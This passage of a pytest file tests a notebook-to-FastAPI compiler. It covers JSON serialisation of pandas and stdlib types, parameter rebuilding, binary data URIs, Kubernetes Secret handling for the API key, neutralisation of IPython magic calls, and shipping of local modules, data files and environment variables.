                    "def maybe(xs: Optional[list[pd.Series]] = None):\n    return None if xs is None else [float(s.mean()) for s in xs]\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

def post(name, body):
    return client.post("/" + name, json=body, headers=headers)

def result(name, body):
    r = post(name, body)
    assert r.status_code == 200, (name, r.text)
    return r.json()["result"]

assert result("shapes", {{"xs": [[1, 2, 3], [[1], [2]]]}}) == [[3], [2, 1]]
assert result("sums", {{"arrays": [[1, 2], [3]]}}) == [3.0, 3.0]
assert result("sums", {{}}) == []
assert result("widths", {{"frames": {{"a": {{"x": [1], "y": [2]}}, "b": [{{"z": 1}}]}}}}) == {{"a": 2, "b": 1}}
assert result("maybe", {{"xs": [[1, 3]]}}) == [2.0]
assert result("maybe", {{}}) is None
assert post("shapes", {{"xs": 5}}).status_code == 422
assert post("shapes", {{"xs": None}}).status_code == 422  # not Optional
print("ARRAY_CONTAINERS_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "ARRAY_CONTAINERS_E2E_OK" in proc.stdout


def test_compiler_pipeline_pandas_periods_intervals_and_datetime_keys_are_plain_json(tmp_path):
    """Confirmed before this: a returned pd.Period came back as a silent `{}`,
    a pd.Interval (every pd.cut bin) was a 500, and a time-indexed Series
    had '2024-01-01 00:00:00' keys while its datetime values were ISO."""
    pytest.importorskip("pandas")
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "import pandas as pd\n"
                    "def month(n: int):\n    return pd.Period('2024-01', freq='M')\n\n"
                    "def months(n: int):\n    return pd.period_range('2024-01', periods=2, freq='M')\n\n"
                    "def interval(n: int):\n    return pd.Interval(0, 1.5)\n\n"
                    "def bins(n: int):\n    return pd.cut([1, 5], bins=[0, 2, 6])\n\n"
                    "def counts(n: int):\n    return pd.Series([1, 2], index=pd.date_range('2024-01-01', periods=2))\n\n"
                    "def by_month(n: int):\n    return pd.Series([3], index=pd.period_range('2024-01', periods=1, freq='M'))\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

def call(name):
    response = client.post("/" + name, json={{"n": 1}}, headers=headers)
    assert response.status_code == 200, (name, response.status_code, response.text)
    return response.json()["result"]

assert call("month") == "2024-01"
assert call("months") == ["2024-01", "2024-02"]
assert call("interval") == {{"left": 0, "right": 1.5, "closed": "right"}}
assert call("bins") == [
    {{"left": 0, "right": 2, "closed": "right"}},
    {{"left": 2, "right": 6, "closed": "right"}},
]
assert call("counts") == {{"2024-01-01T00:00:00": 1, "2024-01-02T00:00:00": 2}}
assert call("by_month") == {{"2024-01": 3}}
print("PANDAS_SCALARS_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "PANDAS_SCALARS_E2E_OK" in proc.stdout


def test_compiler_pipeline_bytes_and_binary_file_parameters_accept_data_uris(tmp_path):
    """Confirmed before this: a `bytes` parameter received the UTF-8 bytes of
    the data URI string itself (so the app's own binary output could not be
    sent back in), and an io.BytesIO parameter got a bare str -- a 500."""
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "import io\nfrom typing import BinaryIO, Optional\n"
                    "def make_png(n: int):\n    return b'\\x89PNG\\r\\n\\x1a\\n' + bytes([n])\n\n"
                    "def inspect_blob(blob: bytes):\n    return blob.hex()\n\n"
                    "def read_file(f: io.BytesIO):\n    return f.read().hex()\n\n"
                    "def read_binary(f: BinaryIO):\n    return len(f.read())\n\n"
                    "def maybe_blob(blob: Optional[bytes] = None):\n    return None if blob is None else len(blob)\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

def post(name, body):
    return client.post("/" + name, json=body, headers=headers)

def result(name, body):
    r = post(name, body)
    assert r.status_code == 200, (name, r.text)
    return r.json()["result"]

png_uri = result("make_png", {{"n": 7}})
assert png_uri.startswith("data:image/png;base64,")
# The app's own binary output round-trips back in as the original bytes.
assert result("inspect_blob", {{"blob": png_uri}}) == "89504e470d0a1a0a07"
assert result("read_file", {{"f": png_uri}}) == "89504e470d0a1a0a07"
assert result("read_binary", {{"f": "abc"}}) == 3  # plain text stays UTF-8
assert result("inspect_blob", {{"blob": "hi"}}) == "6869"
assert result("maybe_blob", {{}}) is None
assert result("maybe_blob", {{"blob": "data:application/octet-stream;base64,AAE="}}) == 2
bad = post("inspect_blob", {{"blob": "data:image/png;base64,***"}})
assert bad.status_code == 422 and "base64" in bad.text, bad.text
assert post("inspect_blob", {{}}).status_code == 422
print("BINARY_PARAMS_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "BINARY_PARAMS_E2E_OK" in proc.stdout


def test_compiler_pipeline_unmodeled_parameter_types_are_rebuilt_from_json(tmp_path):
    """Confirmed before this: a parameter typed as a plain notebook class
    (or numpy scalar / pandas Timestamp) degraded to Any and reached the
    function as a raw dict/str, so `cfg.lr` / `ts.year` was a 500."""
    pytest.importorskip("numpy")
    pytest.importorskip("pandas")
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "import numpy as np\nimport pandas as pd\nfrom typing import Optional\n"
                    "class Settings:\n    def __init__(self, lr: float, epochs: int = 3):\n"
                    "        self.lr = lr\n        self.epochs = epochs\n\n"
                    "class Point:\n    def __init__(self, x, y):\n        self.x, self.y = x, y\n\n"
                    "class Bag:\n    pass\n\n"
                    "def bag(b: Bag):\n    return b.k\n\n"
                    "def plan(cfg: Settings):\n    return cfg.lr * cfg.epochs\n\n"
                    "def norm(p: Point):\n    return p.x ** 2 + p.y ** 2\n\n"
                    "def maybe(cfg: Optional[Settings] = None):\n    return None if cfg is None else cfg.epochs\n\n"
                    "def year(ts: pd.Timestamp):\n    return ts.year\n\n"
                    "def scaled(x: np.float64):\n    return float(x.round(1))\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

def post(name, body):
    return client.post("/" + name, json=body, headers=headers)

def result(name, body):
    r = post(name, body)
    assert r.status_code == 200, (name, r.text)
    return r.json()["result"]

assert result("plan", {{"cfg": {{"lr": 0.5}}}}) == 1.5  # object -> keyword args
assert result("norm", {{"p": [3, 4]}}) == 25  # array -> positional args
assert result("bag", {{"b": {{"k": 2}}}}) == 2  # no __init__ -> attributes
assert result("maybe", {{"cfg": {{"lr": 1, "epochs": 7}}}}) == 7
assert result("maybe", {{}}) is None
assert result("year", {{"ts": "2024-03-05"}}) == 2024  # scalar -> single arg
assert result("scaled", {{"x": 1.26}}) == 1.3
bad = post("plan", {{"cfg": {{"wrong": 1}}}})
assert bad.status_code == 422 and "Settings" in bad.text, bad.text
print("UNMODELED_PARAMS_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "UNMODELED_PARAMS_E2E_OK" in proc.stdout


def test_compiler_pipeline_dataframe_index_labels_are_kept_in_records(tmp_path):
    """Confirmed before this: a returned groupby/agg or set_index DataFrame
    lost its index -- the group keys -- because records drop the index."""
    pytest.importorskip("pandas")
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "import pandas as pd\n"
                    "df = pd.DataFrame({'team': ['a', 'a', 'b'], 'year': [1, 2, 1], 'pts': [1, 2, 3]})\n\n"
                    "def by_team(n: int):\n    return df.groupby('team').agg(total=('pts', 'sum'))\n\n"
                    "def by_two(n: int):\n    return df.groupby(['team', 'year'])[['pts']].sum()\n\n"
                    "def labelled(n: int):\n    return pd.DataFrame({'v': [1]}, index=['x'])\n\n"
                    "def filtered(n: int):\n    return df[df.pts > 1]\n\n"
                    "def clash(n: int):\n    return df.set_index('team', drop=False)[['team']]\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

def call(name):
    response = client.post("/" + name, json={{"n": 1}}, headers=headers)
    assert response.status_code == 200, (name, response.status_code, response.text)
    return response.json()["result"]

assert call("by_team") == [{{"team": "a", "total": 3}}, {{"team": "b", "total": 3}}]
assert call("by_two") == [
    {{"team": "a", "year": 1, "pts": 1}},
    {{"team": "a", "year": 2, "pts": 2}},
    {{"team": "b", "year": 1, "pts": 3}},
]
assert call("labelled") == [{{"index": "x", "v": 1}}]
# An unnamed integer index (a fresh or filtered frame) is still dropped.
assert call("filtered") == [{{"team": "a", "year": 2, "pts": 2}}, {{"team": "b", "year": 1, "pts": 3}}]
assert call("clash") == [{{"team": "a"}}, {{"team": "a"}}, {{"team": "b"}}]
print("FRAME_INDEX_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "FRAME_INDEX_E2E_OK" in proc.stdout


def test_compiler_pipeline_containers_of_unmodeled_types_rebuild_each_item(tmp_path):
    """Confirmed before this: List[Settings], Dict[str, pd.Timestamp] and
    Optional[List[...]] parameters degraded to Any as a whole, so every item
    reached the function as raw JSON -- a 500 on `c.lr` / `ts.year`."""
    pytest.importorskip("pandas")
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "import pandas as pd\nfrom typing import Dict, List, Optional, Tuple\n"
                    "class Settings:\n    def __init__(self, lr: float):\n        self.lr = lr\n\n"
                    "def rates(cfgs: List[Settings]):\n    return [c.lr for c in cfgs]\n\n"
                    "def years(d: Dict[str, pd.Timestamp]):\n    return {k: v.year for k, v in d.items()}\n\n"
                    "def maybe(c: Optional[List[Settings]] = None):\n    return None if c is None else sum(x.lr for x in c)\n\n"
                    "def nested(groups: Dict[str, List[Settings]]):\n    return {k: [c.lr for c in v] for k, v in groups.items()}\n\n"
                    "def pair(p: Tuple[Settings, int]):\n    return p[0].lr * p[1]\n\n"
                    "def unique(s: set[pd.Timestamp]):\n    return sorted(t.month for t in s)\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

def post(name, body):
    return client.post("/" + name, json=body, headers=headers)

def result(name, body):
    r = post(name, body)
    assert r.status_code == 200, (name, r.text)
    return r.json()["result"]

assert result("rates", {{"cfgs": [{{"lr": 0.1}}, {{"lr": 0.2}}]}}) == [0.1, 0.2]
assert result("years", {{"d": {{"a": "2024-01-05", "b": "2021-06-01"}}}}) == {{"a": 2024, "b": 2021}}
assert result("maybe", {{"c": [{{"lr": 1}}, {{"lr": 2}}]}}) == 3
assert result("maybe", {{}}) is None
assert result("nested", {{"groups": {{"g": [{{"lr": 5}}]}}}}) == {{"g": [5]}}
assert result("pair", {{"p": [{{"lr": 2}}, 3]}}) == 6
assert result("unique", {{"s": ["2024-03-01", "2024-01-01"]}}) == [1, 3]
bad = post("rates", {{"cfgs": [{{"nope": 1}}]}})
assert bad.status_code == 422 and "Settings" in bad.text, bad.text
print("UNMODELED_CONTAINERS_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "UNMODELED_CONTAINERS_E2E_OK" in proc.stdout


def test_compiler_pipeline_named_tuples_are_returned_as_objects_keyed_by_field(tmp_path):
    """Confirmed before this: a returned namedtuple / NamedTuple came back as
    a bare list, losing every field name; plain tuples are unchanged."""
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "import collections\nfrom typing import NamedTuple\n"
                    "Pair = collections.namedtuple('Pair', 'left right')\n"
                    "class Stats(NamedTuple):\n    mean: float\n    std: float\n    tags: tuple\n\n"
                    "def summary(n: int):\n    return Stats(float('nan'), 1.5, ('a', b'\\xff'))\n\n"
                    "def pairs(n: int):\n    return [Pair(i, i * 2) for i in range(n)]\n\n"
                    "def plain(n: int):\n    return (1, 2)\n\n"
                    "def echo(s: Stats):\n    return s.std\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

def call(name, body=None):
    response = client.post("/" + name, json=body or {{"n": 2}}, headers=headers)
    assert response.status_code == 200, (name, response.status_code, response.text)
    return response.json()["result"]

stats = call("summary")
assert stats == {{"mean": None, "std": 1.5, "tags": ["a", "data:application/octet-stream;base64,/w=="]}}, stats
assert call("pairs") == [{{"left": 0, "right": 0}}, {{"left": 1, "right": 2}}]
assert call("plain") == [1, 2]
# The object form feeds straight back into a NamedTuple parameter.
assert call("echo", {{"s": {{"mean": 0, "std": 2.5, "tags": []}}}}) == 2.5
print("NAMEDTUPLE_JSON_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "NAMEDTUPLE_JSON_E2E_OK" in proc.stdout


def test_compiler_pipeline_stdlib_mappings_sequences_exceptions_and_matches_are_plain_json(tmp_path):
    """Confirmed before this: ChainMap/UserDict came back as {"maps": ...} /
    {"data": ...}, a UserList as {"data": [...]}, a returned exception as a
    silent {}, and a re.Match or slice was a 500."""
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "import collections, re, types\n"
                    "def chained(n: int):\n    return collections.ChainMap({'a': 1}, {'a': 9, 'b': float('nan')})\n\n"
                    "def user_dict(n: int):\n    return collections.UserDict({'k': [1]})\n\n"
                    "def user_list(n: int):\n    return collections.UserList([float('inf'), 2])\n\n"
                    "def frozen(n: int):\n    return types.MappingProxyType({'x': b'\\xff'})\n\n"
                    "def failure(n: int):\n    return ValueError('bad input')\n\n"
                    "def matched(n: int):\n    return re.match(r'(?P<num>\\d+)(x)', '42x!')\n\n"
                    "def no_match(n: int):\n    return re.match(r'\\d', 'abc')\n\n"
                    "def window(n: int):\n    return slice(1, n)\n\n"
                    "def text(n: int):\n    return 'abc'\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

def call(name):
    response = client.post("/" + name, json={{"n": 5}}, headers=headers)
    assert response.status_code == 200, (name, response.status_code, response.text)
    return response.json()["result"]

assert call("chained") == {{"a": 1, "b": None}}  # first map wins, as ChainMap lookups do
assert call("user_dict") == {{"k": [1]}}
assert call("user_list") == [None, 2]
assert call("frozen") == {{"x": "data:application/octet-stream;base64,/w=="}}
assert call("failure") == {{"error": "ValueError", "message": "bad input"}}
assert call("matched") == {{"match": "42x", "groups": ["42", "x"], "named": {{"num": "42"}}, "span": [0, 3]}}
assert call("no_match") is None
assert call("window") == {{"start": 1, "stop": 5, "step": None}}
assert call("text") == "abc"  # strings are not treated as sequences
print("STDLIB_JSON_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "STDLIB_JSON_E2E_OK" in proc.stdout


def test_kubernetes_manifest_reads_the_api_key_from_a_secret_and_requires_a_custom_key():
    """Confirmed before this: the manifest shipped NOTEBOOK_API_KEY as a plain
    literal set to the app's public default, so a cluster deployment applied
    as generated was callable by anyone who knew this project's source."""
    yaml = pytest.importorskip("yaml")

    from backend.generator.api_generator import GENERATED_APP_ENV_VARS
    from backend.generator.kubernetes_generator import kubernetes_manifest_content

    manifest = kubernetes_manifest_content("My_App", GENERATED_APP_ENV_VARS)
    deployment = next(yaml.safe_load_all(manifest))
    env = {e["name"]: e for e in deployment["spec"]["template"]["spec"]["containers"][0]["env"]}

    assert env["NOTEBOOK_API_KEY"] == {
        "name": "NOTEBOOK_API_KEY",
        "valueFrom": {"secretKeyRef": {"name": "my-app-secrets", "key": "NOTEBOOK_API_KEY"}},
    }
    # The app refuses to start on the default key, so a missing/default
    # Secret can't silently open the deployment.
    assert env["NOTEBOOK_API_REQUIRE_CUSTOM_KEY"]["value"] == "true"
    # Everything else is still a plain value with the app's own default.
    assert env["PORT"]["value"] == "8000"
    assert env["NOTEBOOK_API_STRICT_FIELDS"]["value"] == "false"
    assert "notebook-to-api-dev-key" not in manifest
    # The header tells the operator how to create the Secret, with the same name.
    assert "kubectl create secret generic my-app-secrets" in manifest.splitlines()[1]


def test_kubernetes_manifest_without_env_vars_has_no_secret_reference():
    from backend.generator.kubernetes_generator import kubernetes_manifest_content

    manifest = kubernetes_manifest_content("generated", [])
    assert "secretKeyRef" not in manifest
    assert "name: PORT" in manifest


def test_neutralize_ipython_shell_calls_replaces_unguarded_magic_calls_keeping_lines():
    from backend.compiler import _neutralize_ipython_shell_calls

    code = (
        "get_ipython().run_line_magic('matplotlib', 'inline')\n"
        "out = get_ipython().system('echo é')\n"
        "get_ipython().run_cell_magic(\n    'time',\n    '',\n    'x = 1')\n"
        "y = 2\n"
        "get_ipython().run_line_magic('a', get_ipython().system('b'))\n"
    )
    result = _neutralize_ipython_shell_calls(code)

    assert "get_ipython" not in result
    assert result.count("\n") == code.count("\n")
    namespace = {}
    exec(result, namespace)
    assert namespace["out"] is None and namespace["y"] == 2


def test_neutralize_ipython_shell_calls_leaves_other_code_alone():
    from backend.compiler import _neutralize_ipython_shell_calls

    guarded = "if get_ipython() is not None:\n    pass\nget_ipython().kernel\n"
    assert _neutralize_ipython_shell_calls(guarded) == guarded
    assert _neutralize_ipython_shell_calls("def broken(:\n") == "def broken(:\n"
    assert _neutralize_ipython_shell_calls("shell.run_line_magic('x', 'y')\n") == "shell.run_line_magic('x', 'y')\n"


def test_with_jupyter_prelude_neutralizes_magic_calls_unless_notebook_defines_get_ipython():
    from backend.compiler import _with_jupyter_prelude

    stubbed = _with_jupyter_prelude("get_ipython().run_line_magic('matplotlib', 'inline')\nx = 1\n")
    namespace = {}
    exec(stubbed, namespace)
    assert namespace["x"] == 1

    own = "def get_ipython():\n    return 1\nget_ipython().run_line_magic('a', 'b')\n"
    assert _with_jupyter_prelude(own) == own


def _write_notebook_importing(path, source):
    import nbformat

    notebook = nbformat.v4.new_notebook()
    notebook.cells = [nbformat.v4.new_code_cell(source)]
    with open(path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)


def test_find_local_modules_matches_sibling_modules_and_packages_only(tmp_path):
    from backend.compiler import find_local_modules

    (tmp_path / "helpers.py").write_text("X = 1\n")
    (tmp_path / "pkg").mkdir()
    (tmp_path / "pkg" / "__init__.py").write_text("")
    (tmp_path / "plain_dir").mkdir()
    notebook = tmp_path / "nb.ipynb"

    found = find_local_modules(notebook, {"helpers", "pkg", "plain_dir", "numpy", "not an id"})

    assert found == {"helpers": tmp_path / "helpers.py", "pkg": tmp_path / "pkg"}
    assert find_local_modules(None, {"helpers"}) == {}


def test_compile_ships_local_modules_and_keeps_them_out_of_requirements(tmp_path):
    from backend.compiler import compile_notebook

    (tmp_path / "helpers.py").write_text("def twice(x):\n    return x * 2\n")
    (tmp_path / "pkg").mkdir()
    (tmp_path / "pkg" / "__init__.py").write_text("VALUE = 3\n")
    (tmp_path / "pkg" / "__pycache__").mkdir()
    (tmp_path / "pkg" / "__pycache__" / "x.pyc").write_bytes(b"")
    notebook = tmp_path / "nb.ipynb"
    _write_notebook_importing(
        notebook,
        "import helpers\nfrom pkg import VALUE\n\n"
        "def run(a: int) -> int:\n    return helpers.twice(a) + VALUE\n",
    )
    out = tmp_path / "out"

    compile_notebook(str(notebook), str(out))

    requirements = (out / "requirements.txt").read_text()
    assert "helpers" not in requirements and "pkg" not in requirements
    assert (out / "runtime" / "helpers.py").read_text().startswith("def twice")
    assert (out / "runtime" / "pkg" / "__init__.py").exists()
    assert not (out / "runtime" / "pkg" / "__pycache__").exists()

    module_source = (out / "runtime" / "notebook_module.py").read_text()
    namespace = {"__file__": str(out / "runtime" / "notebook_module.py")}
    import sys
    saved_path = list(sys.path)
    try:
        exec(module_source, namespace)
        assert namespace["run"](4) == 11
    finally:
        sys.path[:] = saved_path
        sys.modules.pop("helpers", None)
        sys.modules.pop("pkg", None)


def test_compile_without_local_modules_adds_no_path_prelude_and_inspect_hides_them(tmp_path):
    from backend.compiler import compile_notebook
    from backend.inspector import inspect_notebook_data

    notebook = tmp_path / "nb.ipynb"
    _write_notebook_importing(notebook, "def run(a: int) -> int:\n    return a\n")
    out = tmp_path / "out"
    compile_notebook(str(notebook), str(out))
    assert "_nb_sys" not in (out / "runtime" / "notebook_module.py").read_text()

    (tmp_path / "helpers.py").write_text("")
    _write_notebook_importing(notebook, "import helpers\n\ndef run(a: int) -> int:\n    return a\n")
    assert "helpers" not in inspect_notebook_data(str(notebook))["dependencies"]


def test_find_data_files_ships_only_existing_files_inside_the_notebook_directory(tmp_path):
    from backend.compiler import find_data_files

    (tmp_path / "sales.csv").write_text("a\n1\n")
    (tmp_path / "data").mkdir()
    (tmp_path / "data" / "cfg.json").write_text("{}")
    (tmp_path.parent / "outside.csv").write_text("x\n")
    cells = [
        "import pandas as pd\n"
        "a = pd.read_csv('sales.csv')\n"
        "b = open('data/cfg.json').read()\n"
        "c = pd.read_csv('missing.csv')\n"
        "d = pd.read_csv('../outside.csv')\n"
        "e = pd.read_csv('data')\n"
    ]

    found = find_data_files(tmp_path / "nb.ipynb", cells)

    assert found == {
        "sales.csv": tmp_path / "sales.csv",
        "data/cfg.json": tmp_path / "data" / "cfg.json",
    }
    assert find_data_files(None, cells) == {}


def test_find_data_files_stops_at_the_size_cap(tmp_path, monkeypatch):
    import backend.compiler as compiler_module

    monkeypatch.setattr(compiler_module, "MAX_SHIPPED_DATA_BYTES", 10)
    (tmp_path / "small.csv").write_text("12345")
    (tmp_path / "big.csv").write_text("x" * 50)
    cells = ["import pandas as pd\npd.read_csv('big.csv')\npd.read_csv('small.csv')\n"]

    assert list(compiler_module.find_data_files(tmp_path / "nb.ipynb", cells)) == ["small.csv"]


def test_import_time_hazards_skip_files_that_will_ship_but_keep_missing_ones(tmp_path):
    from backend.compiler import _find_import_time_hazards

    (tmp_path / "sales.csv").write_text("a\n1\n")
    cells = ["import pandas as pd\npd.read_csv('sales.csv')\npd.read_csv('missing.csv')\ninput()\n"]
    notebook = tmp_path / "nb.ipynb"

    without_path = _find_import_time_hazards(cells)
    with_path = _find_import_time_hazards(cells, notebook)

    assert len(without_path) == 3
    assert [(h["kind"], h["path"]) for h in with_path] == [("file_read", "missing.csv"), ("input", None)]


def test_compile_ships_import_time_data_files_and_restores_the_working_directory(tmp_path, monkeypatch):
    from backend.compiler import compile_notebook

    (tmp_path / "numbers.txt").write_text("41\n")
    notebook = tmp_path / "nb.ipynb"
    _write_notebook_importing(
        notebook,
        "BASE = int(open('numbers.txt').read())\n\n"
        "def bump(a: int) -> int:\n    return BASE + a\n",
    )
    out = tmp_path / "out"

    compile_notebook(str(notebook), str(out))

    assert (out / "runtime" / "numbers.txt").read_text() == "41\n"
    source = (out / "runtime" / "notebook_module.py").read_text()
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    monkeypatch.chdir(elsewhere)
    namespace = {"__file__": str(out / "runtime" / "notebook_module.py")}
    exec(source, namespace)

    assert namespace["bump"](1) == 42
    assert Path.cwd() == elsewhere.resolve()


def test_find_notebook_env_vars_reads_every_literal_access_form():
    from backend.compiler import _find_notebook_env_vars

    cells = [
        "import os\nfrom os import environ, getenv\n"
        "A = os.environ['API_KEY']\n"
        "B = os.environ.get('MODEL')\n"
        "C = os.getenv('REGION', 'us')\n"
        "D = os.getenv('TIMEOUT', None)\n"
        "E = environ['TOKEN']\n"
        "F = getenv('EXTRA', default='x')\n"
        "G = os.environ['NOTEBOOK_API_KEY']\n"
        "H = os.environ[dynamic_name]\n"
        "os.environ['WRITTEN'] = '1'\n"
        "def f():\n    return os.environ['API_KEY'] + os.getenv('INSIDE')\n",
        "def broken(:\n",
    ]

    assert _find_notebook_env_vars(cells) == [
        {"name": "API_KEY", "required": True},
        {"name": "EXTRA", "required": False},
        {"name": "INSIDE", "required": True},
        {"name": "MODEL", "required": True},
        {"name": "REGION", "required": False},
        {"name": "TIMEOUT", "required": True},
        {"name": "TOKEN", "required": True},
    ]


def test_compile_lists_notebook_env_vars_in_compose_env_example_and_inspect(tmp_path):
    from backend.compiler import compile_notebook
    from backend.inspector import inspect_notebook_data

    notebook = tmp_path / "nb.ipynb"
    _write_notebook_importing(
        notebook,
        "import os\nKEY = os.environ['OPENAI_API_KEY']\nREGION = os.getenv('REGION', 'us')\n\n"
        "def run(a: int) -> int:\n    return a\n",
    )
    out = tmp_path / "out"

    compile_notebook(str(notebook), str(out))

    compose = (out / "docker-compose.yml").read_text()
    assert "      - OPENAI_API_KEY\n" in compose
    assert "      - REGION\n" in compose
    yaml = pytest.importorskip("yaml")
    assert "OPENAI_API_KEY" in yaml.safe_load(compose)["services"]["out"]["environment"]

    env_example = (out / ".env.example").read_text()
    assert "# required\nOPENAI_API_KEY=\n" in env_example
    assert "# REGION=\n" in env_example

    names = [e["name"] for e in inspect_notebook_data(str(notebook))["notebook_env_vars"]]
    assert names == ["OPENAI_API_KEY", "REGION"]


def test_compose_and_env_example_are_unchanged_without_notebook_env_vars():
    from backend.generator.docker_generator import docker_compose_content, env_example_content

    env_vars = [{"name": "NOTEBOOK_API_X", "default": "1", "description": "x"}]

    assert docker_compose_content("pkg", env_vars) == docker_compose_content("pkg", env_vars, [])
